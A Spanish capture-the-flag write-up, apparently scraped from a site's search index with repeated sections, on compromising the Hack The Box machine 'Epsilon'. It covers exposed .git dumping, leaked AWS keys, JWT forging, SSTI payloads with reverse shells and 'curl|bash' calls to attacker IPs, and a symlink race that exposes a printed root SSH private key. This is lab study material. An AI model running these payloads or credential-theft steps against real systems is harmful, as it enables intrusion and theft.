200, Size: 225, Words: 3, Lines: 2, Duration: 4912ms] config [Status: 200, Size: 92, Words: 9, Lines: 6, Duration: 64ms] info [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 544ms] logs [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 121ms] objects [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 59ms] description [Status: 200, Size: 73, Words: 10, Lines: 2, Duration: 118ms] branches [Status: 301, Size: 320, Words: 20, Lines: 10, Duration: 132ms] refs [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 99ms] .php [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 82ms] [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 83ms] HEAD [Status: 200, Size: 23, Words: 2, Lines: 2, Duration: 108ms] Se recolecta informaci\u00f3n de los directorios encontrados: curl http://10.10.11.134/.git/index | strings % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed 100 225 100 225 0 0 2960 0 --:--:-- --:--:-- --:--:-- 2960 DIRC server.py track_api_CR_148.py # A\u00f1adimos el dominio y subdominio a hosts: cat track_api_CR_148.py | grep htb endpoint_url = 'http://cloud.epsilon.htb' ) curl http://10.10.11.134/.git/refs/heads/master c622771686bd74c16ece91193d29f85b5f9ffa91 \u256d\u2500\u2591\u2592\u2593 \uf17c \ue0b1 \uf115 /home/x/Documentos/htb/epsilon/10.10.11.134/10.10.11.134 \ue0b1 root@xOS3 \ue0b1 \u2714 \ue0b0 \u2570\u2500 curl http://10.10.11.134/.git/objects/c6/22771686bd74c16ece91193d29f85b5f9ffa91 | strings % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed 100 154 100 154 0 0 1949 0 --:--:-- --:--:-- --:--:-- 1974 oe = L # Se encuentra un fichero comprimido con zlib, se descomprime con python pero no hay nada de gran interes: python Python 3.9.2 ( default , Feb 28 2021 , 17 : 03 : 44 ) [ GCC 10.2.1 20210110 ] on linux Type \"help\" , \"copyright\" , \"credits\" or \"license\" for more information . >>> import zlib >>> >>> f = open ( '22771686bd74c16ece91193d29f85b5f9ffa91' , 'rb' ) >>> decompressed_data = zlib . decompress ( f . read ()) >>> print ( decompressed_data ) b 'commit 205 \\x00 tree b5f4c99c772eeb629e53d284275458d75ed9a010 \\n parent b10dd06d56ac760efbbb5d254ea43bf9beb56d2d \\n author root <root@epsilon.htb> 1637170867 +0000 \\n committer root <root@epsilon.htb> 1637170867 +0000 \\n\\n Fixed Typo \\n ' >>> print ( decompressed_data . decode ()) commit 205 tree b5f4c99c772eeb629e53d284275458d75ed9a010 parent b10dd06d56ac760efbbb5d254ea43bf9beb56d2d author root < root @epsilon . htb > 1637170867 + 0000 committer root < root @epsilon . htb > 1637170867 + 0000 ## Alternativa para descargar el repositorio: pip install GitHack githack http : // epsilon . htb /. git INFO : githack . scanner : Target : http : // epsilon . htb /. git / ERROR : githack . scanner : HTTP Error 404 : Not Found : http : // epsilon . htb /. git / logs / refs / stash ERROR : githack . scanner : HTTP Error 404 : Not Found : http : // epsilon . htb /. git / refs / stash ERROR : githack . scanner : HTTP Error 404 : Not Found : http : // epsilon . htb /. git / refs / remotes / origin / master INFO : githack . scanner : commit : c51441640fd25e9fba42725147595b5918eba0f1 INFO : githack . scanner : commit : c622771686bd74c16ece91193d29f85b5f9ffa91 INFO : githack . scanner : commit : 7 cf92a7a09e523c1c667d13847c9ba22464412f3 INFO : githack . scanner : tree : cf489a3776d2bf87ac32de4579e852a4dc116ce8 INFO : githack . scanner : tree : b5f4c99c772eeb629e53d284275458d75ed9a010 INFO : githack . scanner : Blob : 545 f6fe2204336c1ea21720cbaa47572eb566e34 INFO : githack . scanner : commit : b10dd06d56ac760efbbb5d254ea43bf9beb56d2d INFO : githack . scanner : tree : ab07f7cdc7f410b8c8f848ee5674ec550ecb61ca INFO : githack . scanner : Blob : 8 d3b52e153c7d5380b183bbbb51f5d4020944630 INFO : githack . scanner : Blob : dfdfa17ca5701b1dca5069b6c3f705a038f4361e INFO : githack . scanner : Blob : fed7ab97cf361914f688f0e4f2d3adfafd1d7dca INFO : githack . scanner : tree : 65 b80f62da28254f67f0bea392057fd7d2330e2d INFO : githack . scanner : Total : 2 INFO : githack . scanner :[ OK ] track_api_CR_148 . py : ( '8d3b52e153c7d5380b183bbbb51f5d4020944630' , 'blob' ) INFO : githack . scanner :[ OK ] server . py : ( 'dfdfa17ca5701b1dca5069b6c3f705a038f4361e' , 'blob' ) Hacking AWS - LAMBDA Tras usar la alternativa se puede analizar el repositorio con mas profundidad: # Se obtienen las keys de AWS > lla drwxr-xr-x root root 64 B Thu Sep 1 22 :38:02 2022 \uf115 . drwxr-xr-x root root 22 B Thu Sep 1 22 :38:01 2022 \uf115 .. drwxr-xr-x root root 78 B Thu Sep 1 22 :43:49 2022 \uf115 .git .rw-r--r-- root root 1 .6 KB Thu Sep 1 22 :38:02 2022 \ue606 server.py .rw-r--r-- root root 1 .1 KB Thu Sep 1 22 :38:02 2022 \ue606 track_api_CR_148.py > git log commit c622771686bd74c16ece91193d29f85b5f9ffa91 ( HEAD -> master ) Author: root <root@epsilon.htb> Date: Wed Nov 17 17 :41:07 2021 +0000 Fixed Typo commit b10dd06d56ac760efbbb5d254ea43bf9beb56d2d Author: root <root@epsilon.htb> Date: Wed Nov 17 10 :02:59 2021 +0000 Adding Costume Site commit c51441640fd25e9fba42725147595b5918eba0f1 Author: root <root@epsilon.htb> Date: Wed Nov 17 10 :00:58 2021 +0000 Updatig Tracking API commit 7cf92a7a09e523c1c667d13847c9ba22464412f3 Author: root <root@epsilon.htb> Date: Wed Nov 17 10 :00:28 2021 +0000 Adding Tracking API Module # Con git show tambien lo muestra: > git diff 7cf92a7a09e523c1c667d13847c9ba22464412f3 - aws_access_key_id = 'AQLA5M37BDN6FJP76TDC' , - aws_secret_access_key = 'OsK0o/glWwcjk2U3vVEowkvq5t4EiIreB+WdFo1A' , + aws_access_key_id = '<aws_access_key_id>' , + aws_secret_access_key = '<aws_secret_access_key>' , region_name = 'us-east-1' , - endpoint_url = 'http://cloud.epsilong.htb' ) -aws_lambda = session.client ( 'lambda' ) + endpoint_url = 'http://cloud.epsilon.htb' ) +aws_lambda = session.client ( 'lambda' ) Se accede desde el cli de aws: > aws configure > aws --endpoint-url = \"http://cloud.epsilon.htb\" lambda list-functions { \"Functions\" : [ { \"FunctionName\" : \"costume_shop_v1\" , \"FunctionArn\" : \"arn:aws:lambda:us-east-1:000000000000:function:costume_shop_v1\" , \"Runtime\" : \"python3.7\" , \"Role\" : \"arn:aws:iam::123456789012:role/service-role/dev\" , \"Handler\" : \"my-function.handler\" , \"CodeSize\" : 478 , \"Description\" : \"\" , \"Timeout\" : 3 , \"LastModified\" : \"2022-09-01T01:32:48.353+0000\" , \"CodeSha256\" : \"IoEBWYw6Ka2HfSTEAYEOSnERX7pq0IIVH5eHBBXEeSw=\" , \"Version\" : \" $LATEST \" , \"VpcConfig\" : {} , \"TracingConfig\" : { \"Mode\" : \"PassThrough\" } , \"RevisionId\" : \"969dca3e-3a03-45bd-a4dd-6af102253cc5\" , \"State\" : \"Active\" , \"LastUpdateStatus\" : \"Successful\" , \"PackageType\" : \"Zip\" } ] } # De este modo conseguimos la ruta de la \u00fanica funci\u00f3n existe: > aws --endpoint-url = \"http://cloud.epsilon.htb\" lambda get-function --function-name = costume_shop_v1 { \"Configuration\" : { \"FunctionName\" : \"costume_shop_v1\" , \"FunctionArn\" : \"arn:aws:lambda:us-east-1:000000000000:function:costume_shop_v1\" , \"Runtime\" : \"python3.7\" , \"Role\" : \"arn:aws:iam::123456789012:role/service-role/dev\" , \"Handler\" : \"my-function.handler\" , \"CodeSize\" : 478 , \"Description\" : \"\" , \"Timeout\" : 3 , \"LastModified\" : \"2022-09-01T01:32:48.353+0000\" , \"CodeSha256\" : \"IoEBWYw6Ka2HfSTEAYEOSnERX7pq0IIVH5eHBBXEeSw=\" , \"Version\" : \" $LATEST \" , \"VpcConfig\" : {} , \"TracingConfig\" : { \"Mode\" : \"PassThrough\" } , \"RevisionId\" : \"969dca3e-3a03-45bd-a4dd-6af102253cc5\" , \"State\" : \"Active\" , \"LastUpdateStatus\" : \"Successful\" , \"PackageType\" : \"Zip\" } , \"Code\" : { \"Location\" : \"http://cloud.epsilon.htb/2015-03-31/functions/costume_shop_v1/code\" } , \"Tags\" : {} } # Se descarga el c\u00f3digo de la funci\u00f3n, tener en cuenta que viene zipeado: > curl 'http://cloud.epsilon.htb/2015-03-31/functions/costume_shop_v1/code' --output codigo.zip > unzip codigo.zip Archive: codigo inflating: lambda_function.py # Se obtiene el secret: > catn lambda_function.py import json secret = 'RrXCv`mrNe!K!4+5`wYq' #apigateway authorization for CR-124 '''Beta release for tracking''' def lambda_handler ( event, context ) : try: id = event [ 'queryStringParameters' ][ 'order_id' ] if id: return { 'statusCode' : 200 , 'body' : json.dumps ( str ( resp )) #dynamodb tracking for CR-342 } else : return { 'statusCode' : 500 , 'body' : json.dumps ( 'Invalid Order ID' ) } except: return { 'statusCode' : 500 , 'body' : json.dumps ( 'Invalid Order ID' ) } # Con python3 generamos un jwt v\u00e1lido: >>> import jwt >>> encoded_jwt = jwt . encode ({ 'username' : 'admin' }, 'RrXCv`mrNe!K!4+5`wYq' , algorithm = 'HS256' ) >>> print ( encoded_jwt ) b 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.8JUBz8oy5DlaoSmr0ffLb_hrdSHl0iLMGz-Ece7VNtg' Se adjunta el token a la p\u00e1quina que no teniamos autorizaci\u00f3n SSTI (Server Side Template Injection) El par\u00e1metro custome es vulnerable a SSTI: Se adjunta el token a la p\u00e1quina que no teniamos autorizaci\u00f3n # Payload: costume ={ % for x in () .__class__.__base__.__subclasses__ () % }{ % if \"warning\" in x.__name__ % }{{ x () ._module.__builtins__ [ '__import__' ]( 'os' ) .popen ( \"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\"10.10.14.16\\\",4443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\\\"/bin/cat\\\", \\\"/home/tom/user.txt\\\"]);'\" ) .read () .zfill ( 417 )}}{ %endif% }{ % endfor % } & q = cccc & addr = cccc RCE - Forma de ejecutar una shell reversa: # Descarga de script para ejecutar reverse shell (/bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.14.16/4443 0>&1') (nc -lvnp 4443 [para recibir la salida]) (python -m http.server 80 [servidor web con el script]) costume ={ % for x in () .__class__.__base__.__subclasses__ () % }{ % if \"warning\" in x.__name__ % }{{ x () ._module.__builtins__ [ '__import__' ]( 'os' ) .popen ( \"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\"10.10.14.16\\\",4443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\\\"/usr/bin/wget\\\", \\\"http://10.10.14.16/xshell.sh\\\"]);'\" ) .read () .zfill ( 417 )}}{ %endif% }{ % endfor % } & q = cccc & addr = cccc # Servidor python http en el puerto 80 y ejecucion de reverse shell (nc -lvnp 4443) costume ={ % for x in () .__class__.__base__.__subclasses__ () % }{ % if \"warning\" in x.__name__ % }{{ x () ._module.__builtins__ [ '__import__' ]( 'os' ) .popen ( \"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\"10.10.14.16\\\",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\\\"/bin/bash\\\", \\\"xshell.sh\\\"]);'\" ) .read () .zfill ( 417 )}}{ %endif% }{ % endfor % } & q = cccc & addr = cccc RCE Alternativa - M\u00e1s simplificada: {{ self._TemplateReference__context.namespace.__init__.__globals__.os.popen ( 'id' ) .read () }} {{ self._TemplateReference__context.namespace.__init__.__globals__.os.system ( 'curl 10.10.14.15|bash' ) .read () }} Escalate privileges Monitorizando procesos con pspy64 se localiza un script que ciclicamente se ejecuta cada cierto tiempo con permisos de root: tom@epsilon:/tmp/var/www$ cat /usr/bin/backup.sh #!/bin/bash file = ` date +%N ` /usr/bin/rm -rf /opt/backups/* /usr/bin/tar -cvf \"/opt/backups/ $file .tar\" /var/www/app/ sha1sum \"/opt/backups/ $file .tar\" | cut -d ' ' -f1 > /opt/backups/checksum sleep 5 check_file = ` date +%N ` /usr/bin/tar -chvf \"/var/backups/web_backups/ ${ check_file } .tar\" /opt/backups/checksum \"/opt/backups/ $file .tar\" /usr/bin/rm -rf /opt/backups/* Exploit: tom@epsilon:/tmp$ cat escalador.sh #!/bin/bash while true ; do if [ -e /opt/backups/checksum ] ; then echo \"[!] Mostrando backups actuales\" ls -la /var/backups/web_backups/ echo \"[!] Borrando archivo checksum\" rm -f /opt/backups/checksum echo \"[!] Creando link simbolico a id_rsa de root\" ln -sf /root/.ssh/id_rsa /opt/backups/checksum echo \"[!] En 6 segundos vamos a revisar los \u00faltimos backups\" sleep 6 ls -la /var/backups/web_backups/ echo \"[!] Copia el \u00faltimo tiene sorpresa\" fi done tom@epsilon:/tmp$ bash explotado.sh [ ! ] Mostrando backups actuales total 2948 drwxr-xr-x 2 root root 4096 Sep 2 19 :17 . drwxr-xr-x 3 root root 4096 Feb 4 2022 .. -rw-r--r-- 1 root root 1003520 Sep 2 19 :15 002433377 .tar -rw-r--r-- 1 root root 1003520 Sep 2 19 :16 027571548 .tar -rw-r--r-- 1 root root 1003520 Sep 2 19 :17 063984736 .tar [ ! ] Borrando archivo checksum [ ! ] Creando link simbolico a id_rsa de root [ ! ] En 6 segundos vamos a revisar los \u00faltimos backups total 3928 drwxr-xr-x 2 root root 4096 Sep 2 19 :18 . drwxr-xr-x 3 root root 4096 Feb 4 2022 .. -rw-r--r-- 1 root root 1003520 Sep 2 19 :15 002433377 .tar -rw-r--r-- 1 root root 1003520 Sep 2 19 :16 027571548 .tar -rw-r--r-- 1 root root 1003520 Sep 2 19 :17 063984736 .tar -rw-r--r-- 1 root root 1003520 Sep 2 19 :18 109662329 .tar [ ! ] Copia el \u00faltimo tiene sorpresa tom@epsilon:/tmp$ cp /var/backups/web_backups/109662329.tar . tom@epsilon:/tmp$ tar xvf 109662329 .tar opt/backups/checksum opt/backups/090647821.tar tom@epsilon:/tmp$ cat opt/backups/checksum -----BEGIN OPENSSH PRIVATE KEY----- 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 == -----END OPENSSH PRIVATE KEY----- tom@epsilon:/tmp/opt/backups$ chmod 600 checksum tom@epsilon:/tmp/opt/backups$ ssh root@localhost -i checksum root@epsilon:~# cat /root/root.txt c2c9bb669159cbdabb8d2ee4f2e377df","title":"Epsilon"},{"location":"maquinas/linux/epsilon/#epsilon-htb","text":"","title":"Epsilon HTB"},{"location":"maquinas/linux/epsilon/#recon","text":"Se comprueba que la m\u00e1quina est\u00e1 activa: ping 10.10.11.134","title":"Recon"},{"location":"maquinas/linux/epsilon/#enum","text":"Se realiza un scan de los 65535 puertos TCP: nmap -sS -Pn -p- -n --open --min-rate 5000 -oG allPorts 10.10.11.134 Se realiza un scan de los puertos abiertos: nmap -sCV -p22,80 10.10.11.134 -oN openPorts PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA) | 256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA) |_ 256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519) 80/tcp open http Apache httpd 2.4.41 | http-git: | 10.10.11.134:80/.git/ | Git repository found! | Repository description: Unnamed repository; edit this file 'description' to name the... |_ Last commit message: Updating Tracking API # Please enter the commit message for... |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: 403 Forbidden Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel Fuzzing (se fuzzea el directorio .git que nos reporta nmap): ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.11.134/.git/FUZZ -e .php,.bak,.git -t 300 /'___\\ /'___\\ /'___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.4.1-dev ________________________________________________ :: Method : GET :: URL : http://10.10.11.134/.git/FUZZ :: Wordlist : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt :: Extensions : .php .bak .git :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 300 :: Matcher : Response status: 200,204,301,302,307,401,403,405,500 ________________________________________________ index [Status: 200, Size: 225, Words: 3, Lines: 2, Duration: 4912ms] config [Status: 200, Size: 92, Words: 9, Lines: 6, Duration: 64ms] info [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 544ms] logs [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 121ms] objects [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 59ms] description [Status: 200, Size: 73, Words: 10, Lines: 2, Duration: 118ms] branches [Status: 301, Size: 320, Words: 20, Lines: 10, Duration: 132ms] refs [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 99ms] .php [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 82ms] [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 83ms] HEAD [Status: 200, Size: 23, Words: 2, Lines: 2, Duration: 108ms] Se recolecta informaci\u00f3n de los directorios encontrados: curl http://10.10.11.134/.git/index | strings % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed 100 225 100 225 0 0 2960 0 --:--:-- --:--:-- --:--:-- 2960 DIRC server.py track_api_CR_148.py # A\u00f1adimos el dominio y subdominio a hosts: cat track_api_CR_148.py | grep htb endpoint_url = 'http://cloud.epsilon.htb' ) curl http://10.10.11.134/.git/refs/heads/master c622771686bd74c16ece91193d29f85b5f9ffa91 \u256d\u2500\u2591\u2592\u2593 \uf17c \ue0b1 \uf115 /home/x/Documentos/htb/epsilon/10.10.11.134/10.10.11.134 \ue0b1 root@xOS3 \ue0b1 \u2714 \ue0b0 \u2570\u2500 curl http://10.10.11.134/.git/objects/c6/22771686bd74c16ece91193d29f85b5f9ffa91 | strings % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed 100 154 100 154 0 0 1949 0 --:--:-- --:--:-- --:--:-- 1974 oe = L # Se encuentra un fichero comprimido con zlib, se descomprime con python pero no hay nada de gran interes: python Python 3.9.2 ( default , Feb 28 2021 , 17 : 03 : 44 ) [ GCC 10.2.1 20210110 ] on linux Type \"help\" , \"copyright\" , \"credits\" or \"license\" for more information . >>> import zlib >>> >>> f = open ( '22771686bd74c16ece91193d29f85b5f9ffa91' , 'rb' ) >>> decompressed_data = zlib . decompress ( f . read ()) >>> print ( decompressed_data ) b 'commit 205 \\x00 tree b5f4c99c772eeb629e53d284275458d75ed9a010 \\n parent b10dd06d56ac760efbbb5d254ea43bf9beb56d2d \\n author root <root@epsilon.htb> 1637170867 +0000 \\n committer root <root@epsilon.htb> 1637170867 +0000 \\n\\n Fixed Typo \\n ' >>> print ( decompressed_data . decode ()) commit 205 tree b5f4c99c772eeb629e53d284275458d75ed9a010 parent b10dd06d56ac760efbbb5d254ea43bf9beb56d2d author root < root @epsilon . htb > 1637170867 + 0000 committer root < root @epsilon . htb > 1637170867 + 0000 ## Alternativa para descargar el repositorio: pip install GitHack githack http : // epsilon . htb /. git INFO : githack . scanner : Target : http : // epsilon . htb /. git / ERROR : githack . scanner : HTTP Error 404 : Not Found : http : // epsilon . htb /. git / logs / refs / stash ERROR : githack . scanner : HTTP Error 404 : Not Found : http : // epsilon . htb /. git / refs / stash ERROR : githack . scanner : HTTP Error 404 : Not Found : http : // epsilon . htb /. git / refs / remotes / origin / master INFO : githack . scanner : commit : c51441640fd25e9fba42725147595b5918eba0f1 INFO : githack . scanner : commit : c622771686bd74c16ece91193d29f85b5f9ffa91 INFO : githack . scanner : commit : 7 cf92a7a09e523c1c667d13847c9ba22464412f3 INFO : githack . scanner : tree : cf489a3776d2bf87ac32de4579e852a4dc116ce8 INFO : githack . scanner : tree : b5f4c99c772eeb629e53d284275458d75ed9a010 INFO : githack . scanner : Blob : 545 f6fe2204336c1ea21720cbaa47572eb566e34 INFO : githack . scanner : commit : b10dd06d56ac760efbbb5d254ea43bf9beb56d2d INFO : githack . scanner : tree : ab07f7cdc7f410b8c8f848ee5674ec550ecb61ca INFO : githack . scanner : Blob : 8 d3b52e153c7d5380b183bbbb51f5d4020944630 INFO : githack . scanner : Blob : dfdfa17ca5701b1dca5069b6c3f705a038f4361e INFO : githack . scanner : Blob : fed7ab97cf361914f688f0e4f2d3adfafd1d7dca INFO : githack . scanner : tree : 65 b80f62da28254f67f0bea392057fd7d2330e2d INFO : githack . scanner : Total : 2 INFO : githack . scanner :[ OK ] track_api_CR_148 . py : ( '8d3b52e153c7d5380b183bbbb51f5d4020944630' , 'blob' ) INFO : githack . scanner :[ OK ] server . py : ( 'dfdfa17ca5701b1dca5069b6c3f705a038f4361e' , 'blob' )","title":"Enum"},{"location":"maquinas/linux/epsilon/#hacking-aws-lambda","text":"Tras usar la alternativa se puede analizar el repositorio con mas profundidad: # Se obtienen las keys de AWS > lla drwxr-xr-x root root 64 B Thu Sep 1 22 :38:02 2022 \uf115 . drwxr-xr-x root root 22 B Thu Sep 1 22 :38:01 2022 \uf115 .. drwxr-xr-x root root 78 B Thu Sep 1 22 :43:49 2022 \uf115 .git .rw-r--r-- root root 1 .6 KB Thu Sep 1 22 :38:02 2022 \ue606 server.py .rw-r--r-- root root 1 .1 KB Thu Sep 1 22 :38:02 2022 \ue606 track_api_CR_148.py > git log commit c622771686bd74c16ece91193d29f85b5f9ffa91 ( HEAD -> master ) Author: root <root@epsilon.htb> Date: Wed Nov 17 17 :41:07 2021 +0000 Fixed Typo commit b10dd06d56ac760efbbb5d254ea43bf9beb56d2d Author: root <root@epsilon.htb> Date: Wed Nov 17 10 :02:59 2021 +0000 Adding Costume Site commit c51441640fd25e9fba42725147595b5918eba0f1 Author: root <root@epsilon.htb> Date: Wed Nov 17 10 :00:58 2021 +0000 Updatig Tracking API commit 7cf92a7a09e523c1c667d13847c9ba22464412f3 Author: root <root@epsilon.htb> Date: Wed Nov 17 10 :00:28 2021 +0000 Adding Tracking API Module # Con git show tambien lo muestra: > git diff 7cf92a7a09e523c1c667d13847c9ba22464412f3 - aws_access_key_id = 'AQLA5M37BDN6FJP76TDC' , - aws_secret_access_key = 'OsK0o/glWwcjk2U3vVEowkvq5t4EiIreB+WdFo1A' , + aws_access_key_id = '<aws_access_key_id>' , + aws_secret_access_key = '<aws_secret_access_key>' , region_name = 'us-east-1' , - endpoint_url = 'http://cloud.epsilong.htb' ) -aws_lambda = session.client ( 'lambda' ) + endpoint_url = 'http://cloud.epsilon.htb' ) +aws_lambda = session.client ( 'lambda' ) Se accede desde el cli de aws: > aws configure > aws --endpoint-url = \"http://cloud.epsilon.htb\" lambda list-functions { \"Functions\" : [ { \"FunctionName\" : \"costume_shop_v1\" , \"FunctionArn\" : \"arn:aws:lambda:us-east-1:000000000000:function:costume_shop_v1\" , \"Runtime\" : \"python3.7\" , \"Role\" : \"arn:aws:iam::123456789012:role/service-role/dev\" , \"Handler\" : \"my-function.handler\" , \"CodeSize\" : 478 , \"Description\" : \"\" , \"Timeout\" : 3 , \"LastModified\" : \"2022-09-01T01:32:48.353+0000\" , \"CodeSha256\" : \"IoEBWYw6Ka2HfSTEAYEOSnERX7pq0IIVH5eHBBXEeSw=\" , \"Version\" : \" $LATEST \" , \"VpcConfig\" : {} , \"TracingConfig\" : { \"Mode\" : \"PassThrough\" } , \"RevisionId\" : \"969dca3e-3a03-45bd-a4dd-6af102253cc5\" , \"State\" : \"Active\" , \"LastUpdateStatus\" : \"Successful\" , \"PackageType\" : \"Zip\" } ] } # De este modo conseguimos la ruta de la \u00fanica funci\u00f3n existe: > aws --endpoint-url = \"http://cloud.epsilon.htb\" lambda get-function --function-name = costume_shop_v1 { \"Configuration\" : { \"FunctionName\" : \"costume_shop_v1\" , \"FunctionArn\" : \"arn:aws:lambda:us-east-1:000000000000:function:costume_shop_v1\" , \"Runtime\" : \"python3.7\" , \"Role\" : \"arn:aws:iam::123456789012:role/service-role/dev\" , \"Handler\" : \"my-function.handler\" , \"CodeSize\" : 478 , \"Description\" : \"\" , \"Timeout\" : 3 , \"LastModified\" : \"2022-09-01T01:32:48.353+0000\" 